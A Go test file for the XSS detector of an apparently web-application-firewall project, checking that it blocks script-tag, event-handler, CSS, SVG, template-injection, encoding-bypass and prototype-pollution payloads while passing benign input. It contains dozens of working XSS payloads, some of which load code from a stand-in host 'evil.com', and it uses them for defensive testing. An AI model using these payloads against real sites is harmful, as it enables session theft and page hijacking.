package xss

import (
	"net/http"
	"net/url"
	"strings"
	"testing"

	"github.com/shield/shield/pkg/logger"
)

func TestXSSDetector_Basic(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	cases := []struct {
		name    string
		query   string
		blocked bool
	}{
		{"script tag", "?input=<script>alert(1)</script>", true},
		{"javascript", "?url=javascript:alert(1)", true},
		{"onerror", "?img=<img src=x onerror=alert(1)>", true},
		{"normal", "?name=hello", false},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			u, _ := url.Parse("http://example.com/" + c.query)
			r := &http.Request{URL: u, Method: "GET"}
			matched, _ := x.InspectRequest(r)
			if matched != c.blocked {
				t.Fatalf("expected blocked=%v, got=%v", c.blocked, matched)
			}
		})
	}
}

func TestXSSDetector_DOMBased(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	cases := []struct {
		name    string
		payload string
	}{
		{"innerHTML", "x.innerHTML='<img src=x onerror=alert(1)>'"},
		{"outerHTML", "x.outerHTML='<svg onload=alert(1)>'"},
		{"insertAdjacentHTML", "x.insertAdjacentHTML('beforeend','<script>alert(1)</script>')"},
		{"document.write", "document.write('<script>alert(1)</script>')"},
		{"document.writeln", "document.writeln('<img src=x onerror=alert(1)>')"},
		{"eval", "eval('alert(1)')"},
		{"new Function", "new Function('alert(1)')"},
		{"location", "document.location='javascript:alert(1)'"},
		{"location.href", "document.location.href='javascript:alert(1)'"},
		{"setTimeout with script", "setTimeout('alert(document.cookie)',1000)"},
		{"setInterval with script", "setInterval('alert(1)',1000)"},
		{"src javascript", "img.src='javascript:alert(1)'"},
		{"srcdoc", "iframe.srcdoc='<script>alert(1)</script>'"},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			u, _ := url.Parse("http://example.com/?input=" + url.QueryEscape(c.payload))
			r := &http.Request{URL: u, Method: "GET"}
			matched, pat := x.InspectRequest(r)
			if !matched {
				t.Errorf("DOM-based XSS not detected: %s", c.payload)
			} else {
				t.Logf("blocked by pattern: %s", pat)
			}
		})
	}
}

func TestXSSDetector_EventHandlers(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	handlers := []string{
		"onload", "onclick", "onfocus", "onblur", "onmouseover",
		"onmouseout", "onkeydown", "onkeyup", "onsubmit", "onchange",
		"oninput", "onscroll", "ontouchstart", "onanimationstart",
		"ondrag", "ondrop", "oncopy", "onpaste", "onhashchange",
	}
	for _, h := range handlers {
		t.Run(h, func(t *testing.T) {
			payload := `<img ` + h + `=alert(1)>`
			u, _ := url.Parse("http://example.com/?x=" + url.QueryEscape(payload))
			r := &http.Request{URL: u, Method: "GET"}
			matched, _ := x.InspectRequest(r)
			if !matched {
				t.Errorf("event handler %s not detected", h)
			}
		})
	}
}

func TestXSSDetector_CSSBased(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	cases := []struct {
		name    string
		payload string
	}{
		{"expression", "body{background:expression(alert(1))}"},
		{"import javascript", "@import 'javascript:alert(1)'"},
		{"-moz-binding", "body{-moz-binding:url('http://evil.com/xss.xml#xss')}"},
		{"behavior url", "body{behavior:url('http://evil.com/hijack.htc')}"},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			u, _ := url.Parse("http://example.com/?css=" + url.QueryEscape(c.payload))
			r := &http.Request{URL: u, Method: "GET"}
			matched, _ := x.InspectRequest(r)
			if !matched {
				t.Errorf("CSS XSS not detected: %s", c.payload)
			}
		})
	}
}

func TestXSSDetector_SVGBased(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	cases := []string{
		`<svg onload=alert(1)>`,
		`<svg><script>alert(1)</script></svg>`,
		`<svg><foreignObject><script>alert(1)</script></foreignObject></svg>`,
		`<image onerror=alert(1) src=x>`,
	}

	for i, payload := range cases {
		t.Run(string(rune('A'+i)), func(t *testing.T) {
			u, _ := url.Parse("http://example.com/?svg=" + url.QueryEscape(payload))
			r := &http.Request{URL: u, Method: "GET"}
			matched, _ := x.InspectRequest(r)
			if !matched {
				t.Errorf("SVG XSS not detected: %s", payload)
			}
		})
	}
}

func TestXSSDetector_TemplateInjection(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	cases := []string{
		"{{7*7}}",
		"{{{7*7}}}",
		"{{7+7}}",
		"{{constructor.constructor('alert(1)')()}}",
		"{{self.__init__.__globals__}}",
		"${alert(1)}",
		"${constructor.constructor('alert(1)')()}",
		"${__proto__}",
	}

	for _, payload := range cases {
		t.Run(payload[:min(20, len(payload))], func(t *testing.T) {
			u, _ := url.Parse("http://example.com/?tpl=" + url.QueryEscape(payload))
			r := &http.Request{URL: u, Method: "GET"}
			matched, _ := x.InspectRequest(r)
			if !matched {
				t.Errorf("SSTI not detected: %s", payload)
			}
		})
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func TestXSSDetector_EncodingBypass(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	cases := []struct {
		name    string
		payload string
	}{
		{"hex escape", `\x3cscript\x3ealert(1)\x3c/script\x3e`},
		{"unicode escape", `<script>alert(1)</script>`},
		{"HTML entity script", "&#60;script&#62;alert(1)&#60;/script&#62;"},
		{"HTML hex entity", "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;"},
		{"URL encoded script", "%3Cscript%3Ealert(1)%3C%2Fscript%3E"},
		{"URL encoded iframe", "%3Ciframe%20src=javascript:alert(1)%3E"},
		{"octal escape", "\\074script\\076alert(1)\\074/script\\076"},
	}

	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			u, _ := url.Parse("http://example.com/?x=" + url.QueryEscape(c.payload))
			r := &http.Request{URL: u, Method: "GET"}
			matched, _ := x.InspectRequest(r)
			if !matched {
				t.Errorf("encoding bypass not detected: %s", c.payload)
			}
		})
	}
}

func TestXSSDetector_DOMClobbering(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	cases := []string{
		`<form id=submit>`,
		`<img name=action>`,
		`<form id=all>`,
		`<a id=self>`,
	}

	for i, payload := range cases {
		t.Run(string(rune('A'+i)), func(t *testing.T) {
			u, _ := url.Parse("http://example.com/?dom=" + url.QueryEscape(payload))
			r := &http.Request{URL: u, Method: "GET"}
			matched, _ := x.InspectRequest(r)
			if !matched {
				t.Errorf("DOM clobbering not detected: %s", payload)
			}
		})
	}
}

func TestXSSDetector_PrototypePollution(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	cases := []string{
		`__proto__[isAdmin]=true`,
		`constructor['prototype']['isAdmin']=true`,
		`.constructor.constructor('alert(1)')()`,
	}

	for _, payload := range cases {
		t.Run(payload[:min(20, len(payload))], func(t *testing.T) {
			u, _ := url.Parse("http://example.com/?pp=" + url.QueryEscape(payload))
			r := &http.Request{URL: u, Method: "GET"}
			matched, _ := x.InspectRequest(r)
			if !matched {
				t.Errorf("prototype pollution not detected: %s", payload)
			}
		})
	}
}

func TestXSSDetector_HTMLInjection(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	elements := []string{
		"<iframe src=evil.com>",
		"<object data=evil.com>",
		"<embed src=evil.com>",
		"<frame src=evil.com>",
		"<form action=evil.com>",
		"<link rel=stylesheet href=evil.com>",
		"<meta http-equiv=refresh content='0;url=evil.com'>",
		"<base href=evil.com>",
		"<applet code=evil>",
		"<body onload=alert(1)>",
		"<video><source onerror=alert(1)>",
		"<audio src=x onerror=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<keygen autofocus onfocus=alert(1)>",
		"<marquee onstart=alert(1)>",
		"<isindex action=javascript:alert(1) type=image>",
	}

	for _, payload := range elements {
		t.Run(payload[:min(20, len(payload))], func(t *testing.T) {
			u, _ := url.Parse("http://example.com/?html=" + url.QueryEscape(payload))
			r := &http.Request{URL: u, Method: "GET"}
			matched, _ := x.InspectRequest(r)
			if !matched {
				t.Errorf("HTML injection not detected: %s", payload)
			}
		})
	}
}

func TestXSSDetector_NormalInputs(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	normals := []string{
		"hello world",
		"john.doe@example.com",
		"12345",
		"2024-01-15",
		"John O'Brien",
		"http://example.com/page",
		"<b>bold</b>", // should be sanitized but not blocked as XSS
		"{}",
	}

	for _, input := range normals {
		t.Run(input[:min(20, len(input))], func(t *testing.T) {
			u, _ := url.Parse("http://example.com/?q=" + url.QueryEscape(input))
			r := &http.Request{URL: u, Method: "GET"}
			matched, pat := x.InspectRequest(r)
			if matched {
				t.Errorf("false positive: %q blocked by pattern %q", input, pat)
			}
		})
	}
}

func TestXSSDetector_Disabled(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(false, "block", false, log)

	u, _ := url.Parse("http://example.com/?x=<script>alert(1)</script>")
	r := &http.Request{URL: u, Method: "GET"}
	matched, _ := x.InspectRequest(r)
	if matched {
		t.Error("disabled detector should not block")
	}
}

func TestXSSDetector_DataURI(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	cases := []string{
		"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
		"data:text/html,<script>alert(1)</script>",
	}

	for _, payload := range cases {
		t.Run(payload[:min(20, len(payload))], func(t *testing.T) {
			u, _ := url.Parse("http://example.com/?data=" + url.QueryEscape(payload))
			r := &http.Request{URL: u, Method: "GET"}
			matched, _ := x.InspectRequest(r)
			if !matched {
				t.Errorf("data URI XSS not detected: %s", payload)
			}
		})
	}
}

func TestXSSDetector_PostMessage(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	u, _ := url.Parse("http://example.com/?msg=" + url.QueryEscape(`window.postMessage('*', '*')`))
	r := &http.Request{URL: u, Method: "GET"}
	matched, _ := x.InspectRequest(r)
	if !matched {
		t.Error("postMessage XSS not detected")
	}
}

func TestSanitize(t *testing.T) {
	input := `<script>alert("xss")</script>`
	out := Sanitize(input)
	if out == input {
		t.Fatal("sanitize did not transform input")
	}
	expected := `&lt;script&gt;alert(&quot;xss&quot;)&lt;&#x2F;script&gt;`
	if out != expected {
		t.Errorf("sanitize output = %q, want %q", out, expected)
	}
}

func TestXSSDetector_NestedPayload(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	payload := `<div><img src=x onerror='eval(atob("YWxlcnQoMSk="))'></div>`
	u, _ := url.Parse("http://example.com/?x=" + url.QueryEscape(payload))
	r := &http.Request{URL: u, Method: "GET"}
	matched, _ := x.InspectRequest(r)
	if !matched {
		t.Error("nested payload not detected")
	}
}

func TestXSSDetector_StyleAttributeXSS(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	cases := []string{
		`<div style="background:url(javascript:alert(1))">`,
		`<div style="background:expression(alert(1))">`,
		`<div style="-moz-binding:url(http://evil.com/xss.xml#xss)">`,
		`<div style="@import url(javascript:alert(1))">`,
	}

	for _, payload := range cases {
		t.Run(payload[:min(20, len(payload))], func(t *testing.T) {
			u, _ := url.Parse("http://example.com/?x=" + url.QueryEscape(payload))
			r := &http.Request{URL: u, Method: "GET"}
			matched, _ := x.InspectRequest(r)
			if !matched {
				t.Errorf("style attribute XSS not detected: %s", payload)
			}
		})
	}
}

func TestXSSDetector_CookieAccessPatterns(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	patterns := []string{
		"document.cookie",
		"window.location",
		"document.referrer",
		"localStorage.getItem('token')",
		"sessionStorage.setItem('xss','payload')",
	}

	for _, payload := range patterns {
		t.Run(payload[:min(20, len(payload))], func(t *testing.T) {
			u, _ := url.Parse("http://example.com/?c=" + url.QueryEscape(payload))
			r := &http.Request{URL: u, Method: "GET"}
			matched, _ := x.InspectRequest(r)
			if !matched {
				t.Errorf("sensitive access not detected: %s", payload)
			}
		})
	}
}

func TestXSSDetector_EmptyAndEdgeCases(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	edges := []struct {
		name    string
		urlStr  string
		blocked bool
	}{
		{"empty query", "http://example.com/", false},
		{"no params", "http://example.com/page", false},
		{"empty value", "http://example.com/?x=", false},
		{"very long string", "http://example.com/?x=" + strings.Repeat("A", 10000), false},
		{"newlines", "http://example.com/?x=hello%0Aworld", false},
		{"tab chars", "http://example.com/?x=hello%09world", false},
	}

	for _, e := range edges {
		t.Run(e.name, func(t *testing.T) {
			u, _ := url.Parse(e.urlStr)
			r := &http.Request{URL: u, Method: "GET"}
			matched, pat := x.InspectRequest(r)
			if matched != e.blocked {
				t.Errorf("edge case %q: expected blocked=%v, got=%v (pat=%q)", e.name, e.blocked, matched, pat)
			}
		})
	}
}

func TestXSSDetector_ReloadPatterns(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	// Reload with custom patterns
	x.ReloadPatterns([]string{`(?i)custom_xss_pattern`})

	u, _ := url.Parse("http://example.com/?x=custom_xss_pattern")
	r := &http.Request{URL: u, Method: "GET"}
	matched, _ := x.InspectRequest(r)
	if !matched {
		t.Error("custom reloaded pattern should detect")
	}

	// Normal patterns should not match after reload
	u2, _ := url.Parse("http://example.com/?x=<script>alert(1)</script>")
	r2 := &http.Request{URL: u2, Method: "GET"}
	matched2, _ := x.InspectRequest(r2)
	if matched2 {
		t.Error("old patterns should not match after reload")
	}
}

func TestXSSDetector_ReloadInvalidPattern(t *testing.T) {
	log, _ := logger.New("warn", "json", "")
	x := NewDetector(true, "block", false, log)

	// Invalid regex should be silently skipped
	x.ReloadPatterns([]string{`[invalid(`})
	// Should not panic and should still have old patterns (actually empty after reload of invalid)
}
